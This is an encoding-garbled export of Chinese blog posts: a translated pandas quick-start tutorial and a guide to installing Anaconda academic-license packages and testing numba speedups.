æ—¶é—´åºåˆ—ï¼ˆTime Seriesï¼‰åœ¨é¢‘çŽ‡è½¬æ¢é‡é‡‡æ ·æ—¶ï¼Œpandaså…·æœ‰ç®€å•å¼ºå¤§æœ‰æ•ˆçš„ä½œç”¨ï¼ˆæ¯”å¦‚è¯´ï¼ŒæŠŠç§’çº§é‡‡æ ·çš„æ•°æ®è½¬æ¢æˆ 5åˆ†é’Ÿçº§åˆ«çš„æ•°æ®ï¼‰ã€‚è¿™åœ¨é‡‘èžé¢†åŸŸéžå¸¸å¸¸è§ï¼Œå½“ç„¶ä¹Ÿä¸ä»…å±€é™äºŽæ­¤ã€‚æ›´å¤šå†…å®¹è¯·æŸ¥é˜… ã€ŠTime Series sectionã€‹ æ—¶åˆ†ç§’1234# å‡†å¤‡å·¥ä½œrng = pd.date_range('1/1/2012', periods=100, freq='S')ts = pd.Series(np.random.randint(0, 500, len(rng)), index=rng)ts ï¼ˆæ³¨ï¼šä¸Šå›¾åªæˆªå–äº†ä¸€éƒ¨åˆ†çš„æ•°æ®ï¼‰ 12# è½¬æ¢ts.resample('5Min').sum() æ—¶åŒºæ—¶åŒºè¡¨ç¤º1234# å‡†å¤‡å·¥ä½œrng = pd.date_range('3/6/2012 00:00', periods=5, freq='D')ts = pd.Series(np.random.randn(len(rng)), rng)ts 12ts_utc = ts.tz_localize('UTC')ts_utc æ—¶åŒºè½¬æ¢1ts_utc.tz_convert('US/Eastern') æ—¶æœŸè½¬æ¢ï¼ˆperiodï¼‰123rng = pd.date_range('1/1/2012', periods=5, freq='M')ts = pd.Series(np.random.randn(len(rng)), index=rng)ts 12ps = ts.to_period()ps æ—¶é—´æˆ³è½¬æ¢ï¼ˆtimestampï¼‰1ps.to_timestamp() å‡½æ•°åº”ç”¨åœ¨ æ—¶æœŸï¼ˆperiodï¼‰å’Œæ—¶é—´æˆ³ï¼ˆtimestampï¼‰è½¬æ¢æ—¶æœ‰ä¸€äº›æ–¹ä¾¿çš„ç®—æœ¯å‡½æ•°å¯ä»¥ä½¿ç”¨ã€‚åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬æŠŠä»¥å­£åº¦ä¸ºé¢‘çŽ‡çš„æ•°æ®è½¬æ¢æˆä»¥å­£åº¦æœ«æœˆä¸ºé¢‘çŽ‡çš„æ•°æ®ã€‚123prng = pd.period_range('1990Q1', '2000Q4', freq='Q-NOV')ts = pd.Series(np.random.randn(len(prng)), prng)ts 12ts.index = (prng.asfreq('M', 'e') + 1).asfreq('H', 's') + 9ts.head() åˆ†ç±»åž‹æ•°æ®ï¼ˆcategoricalï¼‰ä»Ž 0.15ç‰ˆæœ¬å¼€å§‹ï¼Œpandasçš„dataframeå¯¹è±¡å¼€å§‹æ”¯æŒåˆ†ç±»æ€§æ•°æ®ï¼ˆcategorical dataï¼‰ã€‚æ›´å¤šå†…å®¹è¯·æŸ¥é˜… ã€Šcategorical introductionã€‹ å’Œ ã€ŠAPI documentationã€‹12df = pd.DataFrame(&#123;"id":[1,2,3,4,5,6], "raw_grade":['a', 'b', 'b', 'a', 'a', 'e']&#125;)df è½¬æ¢å°†åŽŸå§‹gradeæ•°æ®è½¬æ¢æˆåˆ†ç±»åž‹æ•°æ®12df["grade"] = df["raw_grade"].astype("category")df["grade"] é‡å‘½åç»™åˆ†ç±»åž‹æ•°æ®é‡å‘½åä¸ºæ›´æœ‰æ„ä¹‰çš„åå­—ã€‚ï¼ˆé€šè¿‡ Series.cat.categories æ¥æŒ‡æ´¾ä½ç½®ï¼‰12df["grade"].cat.categories = ["very good", "good", "very bad"]df æ•°æ®ä¿®æ•´ç»™åˆ†ç±»åž‹æ•°æ®é‡æŽ’åºï¼ŒåŒæ—¶å¡«è¡¥ç¼ºå¤±å€¼ã€‚ï¼ˆé»˜è®¤æƒ…å†µä¸‹ï¼Œ Series.cat æ–¹æ³•ä¼šè¿”å›žä¸€ä¸ªæ–°çš„Seriesç±»åž‹ ï¼‰12df["grade"] = df["grade"].cat.set_categories(["very bad", "bad", "medium", "good", "very good"])df["grade"] æŽ’åºé—®é¢˜ç»™åˆ†ç±»åž‹æŽ’åºæ˜¯æŒ‰ç…§ categories çš„é¡ºåºï¼Œè€Œä¸æ˜¯æŒ‰ç…§å­—å…¸é¡ºåº1df.sort_values(by="grade") å½’ç±»æŒ‰ç…§åˆ†ç±»åˆ—æ¥æ•°æ®å½’ç±»æ—¶ï¼Œç©ºçš„ç±»åˆ«ä¹Ÿä¼šæ˜¾ç¤ºå‡ºæ¥ã€‚1df.groupby("grade").size() ä½œå›¾ï¼ˆPlottingï¼‰æ›´å¤šå†…å®¹è¯·çœ‹ã€ŠPlottingã€‹ åŸºæœ¬ç”»å›¾1234# æ•°æ®ts = pd.Series(np.random.randn(1000), index=pd.date_range('1/1/2000', periods=1000))ts = ts.cumsum()ts 12# ä½œå›¾ts.plot() dataframeä½œå›¾åœ¨dataframeå¯¹è±¡é‡Œï¼Œplotï¼ˆï¼‰å¯ä»¥å¾ˆæ–¹ä¾¿åœ°ç”»å‡ºæ‰€æœ‰æœ‰æ ‡ç­¾çš„åˆ—ã€‚1234df = pd.DataFrame(np.random.randn(1000, 4), index=ts.index, .....: columns=['A', 'B', 'C', 'D'])df = df.cumsum()plt.figure(); df.plot(); plt.legend(loc='best') æ•°æ®è¯»å†™ï¼ˆGetting Data In/Outï¼‰CSVå†™å…¥æŠŠæ•°æ®å†™è¿› CSVæ–‡ä»¶ã€‚æ›´å¤šå†…å®¹è¯·æŸ¥é˜… ã€ŠWriting to a csv fileã€‹1df.to_csv('foo.csv') è¯»å‡ºå°†æ•°æ®ä»Ž csvæ–‡ä»¶ ä¸­è¯»å‡ºã€‚æ›´å¤šå†…å®¹è¯·æŸ¥é˜… ã€ŠReading from a csv fileã€‹1pd.read_csv('foo.csv') HDF5æ›´å¤šå†…å®¹è¯·çœ‹ ã€ŠHDFStoresã€‹ å†™å…¥1df.to_hdf('foo.h5','df') è¯»å‡º1pd.read_hdf('foo.h5','df') Excelæ›´å¤šå†…å®¹è¯·çœ‹ ã€ŠMS Excelã€‹ å†™å…¥1df.to_excel('foo.xlsx', sheet_name='Sheet1') è¯»å‡º1pd.read_excel('foo.xlsx', 'Sheet1', index_col=None, na_values=['NA']) é™·é˜±ï¼ˆGotchasï¼‰å¦‚æžœä½ è¯•ç€åšè¿™æ ·çš„æ“ä½œï¼Œä½ ä¼šå¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚ æ›´å¤šä¿¡å¿ƒè¯·æŸ¥çœ‹ ã€ŠComparisonsã€‹ å’Œ ã€ŠGotchasã€‹]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[æ•°æ®æŒ–æŽ˜æ¯”èµ›ï¼ˆ4ï¼‰ten Minutes to pandasä¸­æ–‡ç‰ˆä¸Š]]></title>
      <url>%2F2017%2F02%2F01%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%884%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8A%2F</url>
      <content type="text"><![CDATA[pandaså®˜æ–¹æ–‡æ¡£ä¸­æœ‰ä¸€ä»½å¿«é€Ÿå…¥é—¨æ•™ç¨‹ã€Šten Minutes to pandasã€‹ï¼Œè™½ç„¶ç½‘ä¸Šæ—©æœ‰å…¶ä¸­æ–‡ç¿»è¯‘ï¼Œä¸è¿‡å¯èƒ½æ˜¯æ—§ç‰ˆçš„ï¼šï¼‰æ‰€ä»¥é—²æ¥æ— äº‹ï¼Œè‡ªå·±ä¹Ÿç¿»è¯‘æœ€æ–°ç‰ˆæœ¬çš„å­¦ä¹ ä¸€ä¸‹ã€‚ è¿™é‡Œç¤ºä¾‹éƒ¨åˆ†éƒ½ç”±ä»£ç å’Œè¿è¡Œç»“æžœå›¾ç‰‡ç»„æˆï¼Œè¯»è€…å¯ä»¥ç›´æŽ¥å¤åˆ¶ä»£ç æ¥è¿è¡Œï¼›åŒæ—¶ä¸ºäº†æ›´æ¸…æ™°ï¼ŒåŠ å…¥äº†ä¸€äº›å°ç»“æž„æ ‡é¢˜ï¼Œæ‰€ä»¥åœ¨å°ç»†èŠ‚å¤„è·Ÿå®˜æ–¹æ–‡æ¡£ç•¥æœ‰ä¸åŒã€‚æœ¬æœºçš„è¿è¡ŒçŽ¯å¢ƒæ˜¯Python 3.5.2 |Anaconda 4.2.0 (64-bit) ï¼Œpandasåº“çš„ç‰ˆæœ¬ä¸º0.19.2ï¼Œä½¿ç”¨jupyter noterbookä½œä¸ºäº¤äº’çŽ¯å¢ƒï¼Œå¯¹ç…§çš„è¿™ä»½æ–‡æ¡£ç‰ˆæœ¬ä¸º 0.19.2 ã€‚è¿™ç¯‡æ–‡ç« æ˜¯å¯¹ ten-Minutes-to-pandasçš„ä¸ŠåŠéƒ¨åˆ†çš„ç¿»è¯‘ã€‚ä»¥ä¸‹æ­£æ–‡å¼€å§‹ï¼š æ€»è¯´è¿™æ˜¯ä¸€ä»½ä¸»è¦é¢å‘æ–°æ‰‹çš„å¯¹pandasåº“çš„ç®€è¦ä»‹ç»ã€‚æƒ³äº†è§£æ›´å¤šï¼Œä½ å¯ä»¥é€šè¿‡é˜…è¯»Cookbooké€šå¸¸ï¼Œæˆ‘ä»¬åƒä¸‹é¢è¿™æ ·å¯¼å…¥ï¼š123import pandas as pdimport numpy as npimport matplotlib.pylot as plt åˆ›å»ºå¯¹è±¡ï¼ˆObject Creadtionï¼‰å¯ä»¥é€šè¿‡æŸ¥çœ‹Data Structure Intro sectionæ¥èŽ·å–å…³äºŽè¿™èŠ‚çš„æ›´å¤šå†…å®¹ åˆ›å»ºSeriesæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ é€’åˆ—è¡¨ï¼ˆlistï¼‰æ¥åˆ›å»º Seriesï¼Œpandasä¼šè‡ªåŠ¨ä¸ºå…¶ç”Ÿæˆé»˜è®¤æ•´æ•°ç´¢å¼•ã€‚12s = pd.Series([1,3,5,np.nan,6,8])s åˆ›å»ºDataFrameä¼ é€’æ•°ç»„æˆ‘ä»¬å¯é€šè¿‡ä¼ é€’æ•°ç»„å¯¹è±¡ï¼ˆnumpy arrayï¼‰ï¼Œæ—¶é—´ç´¢å¼•ï¼ˆdatetime indexï¼‰ã€åˆ—æ ‡ç­¾ï¼ˆlabeled columnsï¼‰æ¥åˆ›å»º DataFrame12dates = pd.date_range('20130101',periods=6)dates 12df = pd.DataFrame(np.random.randn(6,4),index=dates,columns=list('ABCD'))df ä¼ é€’å­—å…¸æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ é€’ä¸€ä¸ªèƒ½è¢«è½¬æ¢æˆç±»ä¼¼åºåˆ—ï¼ˆSerise-likeï¼‰çš„å­—å…¸å¯¹è±¡ï¼ˆdictï¼‰æ¥åˆ›å»º DataFrame 1234567df2 = pd.DataFrame(&#123; 'A' : 1.,....: 'B' : pd.Timestamp('20130102'),....: 'C' : pd.Series(1,index=list(range(4)),dtype='float32'),....: 'D' : np.array([3] * 4,dtype='int32'),....: 'E' : pd.Categorical(["test","train","test","train"]),....: 'F' : 'foo' &#125;)df2 å®ƒä»¬çš„åˆ—æœ‰ä¸åŒçš„æ•°æ®ç±»åž‹1df2.dtypes IPythonå¦‚æžœä½ ä½¿ç”¨ IPython ï¼Œé‚£ä¹ˆtabé”®èƒ½è‡ªåŠ¨è¡¥å…¨ åˆ—åï¼ˆcolumn namesï¼‰å’Œ å±žæ€§ï¼ˆ public attributesï¼‰ã€‚ä¸‹é¢æ˜¯èƒ½è¢«è‡ªåŠ¨è¡¥å…¨çš„å±žæ€§çš„ä¸€ä¸ªå­é›†ï¼š1df2. ï¼ˆæ³¨ï¼šå¦‚ä¸Šå›¾çº¢ç®­å¤´å¤„æŒ‰ tabé”® ï¼‰ ä½ å¯ä»¥çœ‹åˆ°ï¼Œåˆ—å A ç­‰ä¼šè¢«è‡ªåŠ¨è¡¥é½â€¦â€¦ï¼ˆåŽŸæ–‡ï¼šAs you can see, the columns A, B, C, and D are automatically tab completed. E is there as well; the rest of the attributes have been truncated for brevityã€‚ å› ä¸ºæ²¡æœ‰åšå’ŒåŽŸæ–‡ç›¸ä¼¼çš„å›¾ï¼Œæ‰€ä»¥è¿™å¥åªå¥½ï¼šï¼‰ä¸ç¿»è¯‘äº†hh ï¼‰ æŸ¥çœ‹æ•°æ®ï¼ˆViewing Dataï¼‰æŸ¥çœ‹ Basics section èŽ·å¾—å…³äºŽè¿™èŠ‚çš„æ›´å¤šå†…å®¹ã€‚ æŸ¥çœ‹frameä¸­çš„å¤´éƒ¨å’Œå°¾éƒ¨éƒ¨åˆ†çš„è¡Œ1df.head() 1df.tail() æ˜¾ç¤ºç´¢å¼•ã€åˆ—åã€åº•å±‚numpyæ•°æ®ï¼ˆthe underlying numpy dataï¼‰1df.index 1df.columns 1df.values ï¼ˆæ³¨ï¼šè¿™ä¸ªvaluesï¼Œåº”è¯¥å°±æ˜¯æŠŠdfä¸­çš„æ•°æ®ç›´æŽ¥ä»¥numpy arrayçš„å½¢å¼æ‰“å°å‡ºæ¥ï¼Œæ³¨æ„ä¸Žå‰é¢çš„ df å‘½ä»¤å›¾ç‰‡å¯¹æ¯”ä¸€ä¸‹ï¼‰ å¯¹æ•°æ®è¿›è¡Œå¿«é€Ÿç®€å•ç»Ÿè®¡1df.describe() (æ³¨ï¼šcountï¼šè®¡æ•°ï¼Œå¤šå°‘ä¸ªhhï¼›meanï¼šå¹³å‡æ•°ï¼›stdï¼šæ–¹å·®ï¼›minï¼šæœ€å°å€¼ï¼›25%ï¼šåˆ†ä½æ•°ï¼› 50%ï¼šåˆ†ä½æ•°ï¼Œä¸­ä½æ•°ï¼›75%ï¼šåˆ†ä½æ•°ï¼›maxï¼šæœ€å¤§å€¼) è½¬ç½®ï¼ˆTransposingï¼‰1df.T æŽ’åºæŒ‰è½´æŽ’åºï¼ˆSorting by an axisï¼‰1df.sort_index(axis=1, ascending=True) ï¼ˆæ³¨ï¼šaxis=1è¡¨æ˜ŽæŒ‰ç…§columnæ¥æŽ’åºï¼Œå…³äºŽaxisçš„è®¨è®ºå‚è§ Stackoverflow:What does axis in pandas mean?ï¼›ascending=Falseè¯´æ˜Žè¦ç”¨é™åºæŽ’åºï¼Œå…¶é»˜è®¤å€¼Trueä»£è¡¨å‡åºï¼‰ æŒ‰å€¼æŽ’åºï¼ˆSorting by valuesï¼‰1df.sort_values(by='B') ï¼ˆæ³¨ï¼šè¿™é‡Œæ²¡æœ‰ä¼ å…¥æˆ–æ²¡æœ‰æ˜¾å¼æŒ‡å®šascendingå‚æ•°ï¼Œåˆ™å…¶é»˜è®¤å€¼ä¸ºTrueï¼Œä¸ºå‡åºæŽ’åˆ—ã€‚ï¼‰ é€‰æ‹©ï¼ˆSelectionï¼‰å°½ç®¡python/numpyçš„å…³äºŽé€‰æ‹©ï¼ˆselecting ï¼‰å’Œè®¾å®šï¼ˆsettingï¼‰çš„è¡¨è¾¾å¼èƒ½ç›´æŽ¥ï¼ˆintuitiveï¼‰åœ¨äº¤äº’å¼çŽ¯å¢ƒï¼ˆinteractive workï¼‰ä¸­æ´¾ä¸Šç”¨åœºï¼Œä½†åœ¨å®žé™…å·¥ä½œä¸­ï¼Œæˆ‘ä»¬æŽ¨èä½¿ç”¨ç»è¿‡ä¼˜åŒ–ï¼ˆoptimizedï¼‰çš„pandasæ–¹æ³•ï¼š.at, .iat, .loc, .iloc å’Œ .ix. æƒ³äº†è§£æ›´å¤šè¯·æŸ¥é˜…ï¼šã€ŠIndexing and Selecting Dataã€‹å’Œã€ŠMultiIndex/Advanced Indexingã€‹ èŽ·å–æ•°æ®ï¼ˆGettingï¼‰èŽ·å–åˆ—é€‰æ‹©å•ç‹¬çš„ä¸€åˆ—ï¼Œè¿”å›žä¸€ä¸ª Series å¯¹è±¡ï¼Œç›¸å½“äºŽ df.A1df['A'] ï¼ˆæ³¨ï¼šè¿™é‡Œé™„ä¸Š df.A çš„ç»“æžœï¼šï¼‰ èŽ·å–è¡Œé€šè¿‡ [ ] å¯¹è¡Œè¿›è¡Œé€‰å–ï¼Œè¿™æ“ä½œä¼šå¯¹è¡Œè¿›è¡Œåˆ‡ç‰‡ï¼ˆsliceï¼‰ 1df[0:3] 1df['20130102':'20130104'] é€šè¿‡æ ‡ç­¾é€‰æ‹©ï¼ˆSelection by Labelï¼‰â€”â€” .locï¼ˆæ³¨ï¼šç”±äºŽå†™è¿™ç¯‡æ—¶é—´è¿‡é•¿ï¼Œjupyter notebookä¸­å‰é¢çš„ä»£ç è¦é‡æ–°è¿è¡Œä¸€éï¼Œè€Œå‰é¢çš„ç¤ºä¾‹ä¸­ä½¿ç”¨äº†randomå‡½æ•°äº§ç”Ÿçš„éšæœºå€¼ï¼Œæ‰€ä»¥é‡æ–°è¿è¡ŒåŽä¸‹é¢çš„æ•°æ®ä¼šè·Ÿä¸Šé¢çš„æ•°æ®ä¸å¤ªä¸€æ ·ï¼Œè¿™é‡Œæ”¾ä¸Šé‡æ–°è¿è¡ŒåŽ dfå€¼ çš„å›¾ï¼Œä»¥ä½œä¸ºå¯¹ç…§ã€‚ï¼‰ æƒ³äº†è§£å…³äºŽæœ¬èŠ‚æ›´å¤šå†…å®¹è¯·æŸ¥çœ‹ Selection by Label é€šè¿‡æ ‡ç­¾èŽ·å¾—äº¤å‰åŒºåŸŸï¼ˆcross sectionï¼‰1df.loc[dates[0]] é€šè¿‡æ ‡ç­¾è¿›è¡Œå¤šè½´é€‰æ‹©ï¼ˆmulti-axisï¼‰1df.loc[:,['A','B']] æ ‡ç­¾åˆ‡ç‰‡ï¼Œä¸¤ç«¯ç¡®å®š1df.loc['20130102':'20130104',['A','B']] ç¼©å‡è¿”å›žå¯¹è±¡çš„ç»´åº¦1df.loc['20130102',['A','B']] èŽ·å–æ ‡é‡å€¼1df.loc[dates[0],'A'] å¿«é€ŸèŽ·å–æ ‡é‡å€¼ç»“æžœä¸Žå‰é¢ä¸€ä¸ªæ–¹æ³•ç›¸åŒ1df.at[dates[0],'A'] ï¼ˆæ³¨ï¼š.locå’Œ .atè¿è¡Œæ—¶é—´å¯¹æ¯”å¦‚ä¸‹ï¼šï¼‰ é€šè¿‡ä½ç½®é€‰æ‹©ï¼ˆSelection by Positionï¼‰â€”â€” .ilocæƒ³äº†è§£æœ¬èŠ‚æ›´å¤šå†…å®¹è¯·æŸ¥çœ‹ Selection by Position é€šè¿‡ä¼ å…¥æ•´æ•°æ¥é€‰æ‹©1df.iloc[3] æ•°å€¼åˆ‡ç‰‡ï¼Œè·Ÿnumpy/pythonç±»ä¼¼1df.iloc[3:5,0:2] ä¼ å…¥æŒ‡å®šä½ç½®ï¼ˆæ•´æ•°ï¼‰çš„åˆ—è¡¨ï¼Œä¸Žnumpy/pythonç±»ä¼¼1df.iloc[[1,2,4],[0,2]] å¯¹è¡Œåˆ‡ç‰‡ï¼ˆslicing rowsï¼‰1df.iloc[1:3,:] å¯¹åˆ—åˆ‡ç‰‡ï¼ˆslicing columnsï¼‰1df.iloc[:,1:3] å–å€¼ï¼ˆæ ‡é‡å€¼ï¼‰1df.iloc[1,1] æ›´å¿«å–å€¼ï¼ˆæ ‡é‡å€¼ï¼‰1df.iat[1,1] ï¼ˆæ³¨ï¼šä»¥ä¸‹æ˜¯ .iloc å’Œ .iat çš„æ—¶é—´æ¯”è¾ƒã€‚ï¼‰ é€šè¿‡å¸ƒå°”è¡¨è¾¾å¼è¿›è¡Œç´¢å¼•ï¼ˆBoolean Indexingï¼‰ä½¿ç”¨å•ç‹¬ä¸€åˆ—æ¥é€‰æ‹©æ•°æ®1df[df.A &gt; 0] ä½¿ç”¨ where æ“ä½œæ¥é€‰æ‹©æ•°æ®1df[df &gt; 0] ï¼ˆæ³¨ï¼šè™½ç„¶æ²¡æœ‰å‡ºçŽ°whereï¼Œä½†è¿™ä¸ªç¡®å®žæ˜¯whereæ“ä½œï¼‰ ä½¿ç”¨ isin() æ–¹æ³•æ¥è¿‡æ»¤æ•°æ®1234# å‡†å¤‡å·¥ä½œdf2 = df.copy()df2['E'] = ['one', 'one','two','three','four','three']df2 12# ä½¿ç”¨isin()df2[df2['E'].isin(['two','four'])] è®¾ç½®ï¼ˆSettingï¼‰è®¾ç½®æ–°çš„åˆ—ï¼Œä½¿å…¶æ•°æ®è‡ªåŠ¨æŒ‰ç´¢å¼•æŽ’åˆ—123# å‡†å¤‡å·¥ä½œs1 = pd.Series([1,2,3,4,5,6], index=pd.date_range('20130102', periods=6))s1 123# è®¾ç½®æ–°çš„åˆ—df['F'] = s1df é€šè¿‡æ ‡ç­¾ï¼ˆlabelï¼‰æ¥è®¾ç½®æ•°å€¼1df.at[dates[0],'A'] = 0 é€šè¿‡ä½ç½®ï¼ˆpositionï¼‰æ¥è®¾ç½®æ•°å€¼1df.iat[0,1] = 0 é€šè¿‡æŒ‡å®šnumpyæ•°ç»„æ¥è®¾ç½®æ•°å€¼1df.loc[:,'D'] = np.array([5] * len(df)) ç»è¿‡å‰é¢ä¸€å †æ“ä½œåŽçš„ç»“æžœï¼š é€šè¿‡ where æ“ä½œæ¥è®¾ç½®æ•°å€¼123df2 = df.copy()df2[df2 &gt; 0] = -df2df2 å¤„ç†ç¼ºå¤±å€¼ï¼ˆMissing Dataï¼‰pandasä¸»è¦ç”¨å€¼ np.nan æ¥è¡¨ç¤ºç¼ºå¤±å€¼ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒä¸ä¼šå‚ä¸Žè®¡ç®—ã€‚æ›´å¤šå†…å®¹æŸ¥çœ‹ Missing Data section é‡ç´¢å¼•ï¼ˆReindexingï¼‰é‡ç´¢å¼•èƒ½è®©ä½ å¯¹ç‰¹å®šçš„è½´ï¼ˆaxisï¼‰æ¥è¿›è¡Œç´¢å¼•çš„æ”¹å˜/æ·»åŠ /åˆ é™¤ã€‚å®ƒä¼šè¿”å›žä¸€ä¸ªå¤åˆ¶å€¼ï¼ˆæ³¨ï¼šä¹Ÿå°±æ˜¯è¯´ä¸ä¼šæ”¹å˜åŽŸæœ¬çš„æ•°æ®ï¼‰ã€‚123df1 = df.reindex(index=dates[0:4], columns=list(df.columns) + ['E'])df1.loc[dates[0]:dates[1],'E'] = 1df1 åˆ é™¤æ‰€æœ‰å…·æœ‰ç¼ºå¤±å€¼çš„è¡Œï¼ˆdropnaï¼‰1df1.dropna(how='any') å¡«å……ç¼ºå¤±å€¼ï¼ˆfillnaï¼‰1df1.fillna(value=5) ç¼ºå¤±å€¼çš„å¸ƒå°”è¡¨è¾¾å¼ï¼ˆisnullï¼‰1pd.isnull(df1) å‰©ä½™å†…å®¹è¯·çœ‹ï¼šæ•°æ®æŒ–æŽ˜æ¯”èµ›ï¼ˆ5ï¼‰ten Minutes to pandasä¸­æ–‡ç‰ˆä¸‹]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[æ•°æ®æŒ–æŽ˜æ¯”èµ›ï¼ˆ3ï¼‰ç”³è¯·anaconda-academic-licenseå¹¶ä½¿ç”¨]]></title>
      <url>%2F2017%2F01%2F29%2F%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%883%EF%BC%89%E7%94%B3%E8%AF%B7anaconda-academic-license%E5%B9%B6%E4%BD%BF%E7%94%A8%2F</url>
      <content type="text"><![CDATA[Anacondaæ˜¯pythonçš„ä¸€ä¸ªç§‘å­¦è®¡ç®—å‘è¡Œç‰ˆï¼Œé‡Œé¢é›†æˆäº†å„ç§å„æ ·çš„ç§‘å­¦è®¡ç®—åŒ…ï¼Œå¦‚numpyã€pandasã€sklearnç­‰ã€‚ä½œä¸ºå­¦ç”Ÿï¼Œåœ¨ä½¿ç”¨anacondaå‘è¡Œç‰ˆçš„åŒæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”³è¯·anacondaçš„å­¦æœ¯è¯ä¹¦ï¼Œé€šè¿‡å®ƒå¯ä»¥ä¸‹è½½ä¸€äº›é¢å¤–çš„åŒ…ä»¥å®žçŽ°è®¡ç®—è¿‡ç¨‹çš„åŠ é€Ÿã€‚ æ³¨å†Œã€ç”³è¯·ã€ä¸‹è½½æ³¨å†Œåœ°å€ï¼šhttps://anaconda.org/ å…¶ä¸­çš„emailè¦ç”¨å­¦æ ¡é‚®ç®±ï¼Œå¦åˆ™ä¸èƒ½ç”³è¯·æˆåŠŸã€‚æˆ‘çš„é‚®ç®±æ˜¯ **@stu.xmu.edu.cn åœ¨æ³¨å†Œå®Œäº†åŽï¼Œå…ˆç‚¹å³ä¸Šè§’çš„å¤´åƒå¤„ï¼Œå†é€‰æ‹©My Setting å¦‚ä¸‹ï¼š é€‰æ‹©add ons å°†å³è¾¹çš„ä¸‰ä¸ªlicenseä¸‹è½½ä¸‹æ¥ï¼šMKL Optimizationsã€IOProã€Anaconda Accelerateã€‚ å®‰è£…å…ˆæ‰“å¼€å‘½ä»¤è¡Œï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼ˆæ³¨ï¼Œæˆ‘è¿™é‡Œä»¥windowsä¸‹ä¸ºä¾‹ï¼‰ï¼Œç¡®å®šlicenseçš„å®‰è£…ä½ç½®ã€‚ conda info --license å¦‚å›¾ ï¼ˆæ³¨ï¼šASUSå³ç”¨æˆ·çš„ä¸»æ–‡ä»¶å¤¹ï¼Œå„ä½æ ¹æ®è‡ªå·±çš„ç”µè„‘è°ƒæ•´ï¼‰ ç„¶åŽå°†ä¸‹è½½çš„3ä¸ªlicenseï¼ˆå³txtæ–‡ä»¶ï¼‰æ”¾åˆ° .continuum æ–‡ä»¶å¤¹é‡Œé¢ã€‚è¿™é‡Œæ³¨æ„ä¸‹ï¼Œå¦‚æžœæ‰“å¼€ä¸ªäººæ–‡ä»¶å¤¹(è¿™é‡Œå³ASUSæ–‡ä»¶å¤¹)æ²¡çœ‹åˆ° .continuum ï¼Œé‚£è¦è®°å¾—å‹¾é€‰ä¸€ä¸‹æ˜¾ç¤ºéšè—æ–‡ä»¶ã€‚å¦‚æžœè¿˜ä¸å­˜åœ¨ï¼Œé‚£éœ€è¦è‡ªå·±åˆ›å»º .continuum æ–‡ä»¶å¤¹ã€‚å¦‚ä¸‹ï¼š ç„¶åŽæ‰“å¼€å‘½ä»¤è¡Œï¼Œåˆ†åˆ«è¾“å…¥ conda install accelerate conda install iopro æ³¨æ„ï¼Œæ˜¯åˆ†åˆ«è¾“å…¥ï¼Œè€Œä¸”åœ¨å®‰è£…accelerateæ—¶ä¸ºæ»¡è¶³dependencyä¼šåŒæ—¶å®‰è£…mklï¼Œæ‰€ä»¥å°±ä¸å•ç‹¬è¾“å…¥conda install mkläº†ã€‚æ¯”å¦‚å®‰è£… accelerate æ¨¡å—ï¼Œå¦‚ä¸‹ï¼š è·Ÿç€æç¤ºæ¥ï¼Œä¸‹è½½è¿‡ç¨‹å¯èƒ½æœ‰ç‚¹æ…¢ï¼šï¼‰ æµ‹è¯•ä½¿ç”¨ä»¥accelerateä¸ºä¾‹ï¼Œä»Žadd onsé¡µé¢ä¸­å¯ä»¥çœ‹å‡ºacelerateçš„ä½œç”¨æ˜¯ï¼š Fast Python for GPUs and multi-core with NumbaPro and MKL Optimizations. åœ¨å®‰è£…accelerateåŽæˆ‘ä»¬å¯ä»¥åˆ©ç”¨GPUæ˜¾å¡æ¥åŠ é€Ÿè®¡ç®—è¿‡ç¨‹ã€‚ä¸è¿‡æŸ¥äº†å®˜æ–¹æ–‡æ¡£æœäº†stackoverflowç¿»éäº†googleå’Œç™¾åº¦éƒ½æ²¡æœ‰æ‰¾åˆ°å•ç‹¬å…³äºŽacclerateåº“çš„ä½¿ç”¨ï¼Œå¤§å¤šæ•°çš„è®¨è®ºé›†ä¸­äºŽåœ¨å®‰è£…åŽå¯¹numbaçš„ä½¿ç”¨ï¼Œæ‰€ä»¥è¿™é‡Œç”¨numbaæ¥æµ‹è¯•ä¸€ä¸‹åŠ å¿«äº†å¤šå°‘ã€‚åœ¨æµ‹è¯•å‰æˆ‘æŠŠæ˜¾å¡çš„é©±åŠ¨å‡çº§äº†ä¸‹ï¼ŒæŽ¥ä¸‹æ¥ç¡®å®šä¸€ä¸‹æœºå­çš„æ˜¾å¡æ˜¯å¦æ”¯æŒã€‚å‘½ä»¤è¡Œæ‰“å¼€ï¼Œè¾“å…¥ï¼š123import numba.cuda.api,numba.cuda.cudadrv.libsnumba.cuda.cudadrv.libs.test()numba.cuda.api.detect() ç¬¬ä¸€è¡Œå¯¼å…¥åº“ï¼Œç¬¬äºŒè¡Œç”¨æ¥æ£€æµ‹åº“çš„å®‰è£…æ­£ç¡®ï¼Œç¬¬ä¸‰è¡Œç”¨æ¥ç¡®å®šæ˜¾å¡æ˜¯å¦æ”¯æŒåŠ é€Ÿã€‚ ä¸‹é¢æ˜¯æµ‹è¯•ä»£ç ï¼ˆç½‘ä¸Šæ‰¾çš„ç¨å¾®ä¿®æ”¹äº†ä¸‹ï¼Œè‡ªå·±è¿˜å†™ä¸å‡ºæ¥ï¼‰ï¼š1234567891011121314151617181920212223242526272829303132333435import numpy as npfrom numba import jitnobs = 1000000def proc_numpy(x,y,z): x = x*2 - ( y * 55 ) # these 4 lines represent use cases y = x + y*2 # where the processing time is mostly z = x + y + 99 # a function of, say, 50 to 200 lines z = z * ( z - .88 ) # of fairly simple numerical operations return z@jitdef proc_numba(xx,yy,zz): for j in range(nobs): # as pointed out by Llopis, this for loop x, y = xx[j], yy[j] # is not needed here. it is here by # accident because in the original benchmarks x = x*2 - ( y * 55 ) # I was doing data creation inside the function y = x + y*2 # instead of passing it in as an array z = 